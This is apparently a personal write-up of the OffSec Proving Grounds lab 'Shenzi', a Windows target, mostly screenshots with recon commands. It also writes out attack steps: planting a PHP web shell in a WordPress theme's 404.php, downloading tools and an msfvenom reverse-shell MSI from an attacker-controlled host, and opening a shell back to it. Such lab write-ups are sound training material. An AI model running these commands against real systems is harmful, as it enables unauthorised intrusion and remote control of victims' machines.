---
title: Shenzi
date: 2026-01-27T12:00:04+01:00
draft: false
tags:
  - offsec
  - nmap
  - windows
  - proving-grounds
  - gobuster
  - enum4linux-ng
  - wpscan
categories:
  - Pentesting
  - Offsec
  - Windows
description: "This guide provides readers with the solution to the Proving Grounds Lab: Shenzi"
---
 nmap -p- --min-rate 5000 192.168.230.55 

![](Screenshot%202026-01-07%20at%2015.04.29.png)

Straight away lets look at the http port:

![](Screenshot%202026-01-07%20at%2015.07.42.png)

![](Screenshot%202026-01-07%20at%2015.08.18.png)

![](Screenshot%202026-01-08%20at%2006.27.07.png)

![](Screenshot%202026-01-08%20at%2006.29.15.png)

`nmap -p 80 -sS -sC -sV -A 192.168.230.55

![](Screenshot%202026-01-07%20at%2015.10.34.png)

`gobuster dir -u http://192.168.230.55  -w /usr/share/wordlists/dirb/common.txt`

![](Screenshot%202026-01-07%20at%2015.12.31.png)

![](Screenshot%202026-01-07%20at%2015.14.17.png)

Thought maybe this was another forwarder lab similar to #Robust:

![](Screenshot%202026-01-07%20at%2015.33.33.png)

No access

![](Screenshot%202026-01-07%20at%2015.42.13.png)

`enum4linux-ng -A 192.168.230.55

![](Screenshot%202026-01-07%20at%2015.52.10.png)

netexec smb 192.168.230.55 -u guest -p '' --shares

![](Screenshot%202026-01-07%20at%2015.55.03.png)

`smbclient //192.168.230.55/Shenzi -N`

`mget *`

This will grab anything available on the server.

![](Screenshot%202026-01-08%20at%2005.34.37.png)

![](Screenshot%202026-01-08%20at%2006.08.19.png)

Lets try FFUF and Gobuster:

 `ffuf -u http://192.168.197.55:80/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -t 50  -recursion`

`sudo gobuster dir -w '/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt' -u http://192.168.197.55:80 -t 42 -b 400,401,403,404 --no-error -x php`

![](Screenshot%202026-01-08%20at%2007.04.43.png)

![](Screenshot%202026-01-08%20at%2007.05.22.png)

I gave up and get some help, I knew there was a site to be found and it turns out to be stupidly obvious. 

![](Screenshot%202026-01-08%20at%2006.58.22.png)

`wpscan --url http://$IP/shenzi -e ap,at,u --plugins-detection aggressive -t 20`

![](Screenshot%202026-01-08%20at%2007.25.42.png)

Uploads and cron... 

![](Screenshot%202026-01-08%20at%2007.07.54.png)

Tried a couple of files, no luck

There is a Theme editor and site editor.

![](Screenshot%202026-01-08%20at%2008.37.24.png)

Copy the php-shell code. Update the 404.php file

![](Screenshot%202026-01-08%20at%2008.38.17.png)

![](Screenshot%202026-01-08%20at%2008.36.47.png)

![](Screenshot%202026-01-08%20at%2007.57.10.png)

WinPEAS:
`python -m http.server 135`

`curl http://192.168.45.188:135/winPEASany.exe -o wimp.exe`

![](Screenshot%202026-01-08%20at%2010.35.18.png)

`msfvenom -p windows/x64/shell_reverse_tcp  lhost=192.168.45.188 lport=1234 -f msi -o shell.msi`

![](Screenshot%202026-01-08%20at%2010.45.28.png)

Create an installer

`curl http://192.168.45.188:81/shell.msi -o shell.msi`

![](Screenshot%202026-01-08%20at%2010.48.07.png)

6.5 hours